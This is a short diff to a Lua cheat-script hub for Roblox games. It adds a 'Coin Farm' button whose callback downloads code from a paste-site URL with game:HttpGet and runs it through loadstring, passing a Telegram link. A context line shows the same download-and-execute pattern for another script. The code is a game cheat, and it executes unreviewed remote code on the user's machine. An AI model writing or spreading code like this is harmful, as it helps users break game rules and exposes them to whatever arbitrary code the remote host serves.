@@ -320,6 +320,14 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2
       		print("Clicked")
   	end    
 })
+-- Button
+Tab:AddButton({
+	Name = "Coin Farm",
+      Callback = function()
+loadstring(game:HttpGet("https://shz.al/ZrwhrdHKRDyFfP3TxTyyFn7F"))("https://t.me/KrutoySuslik")
+      		print("Clicked")
+  	end    
+})
 -- Section
 local Section = Tab:AddSection({
 	Name = "Evade"
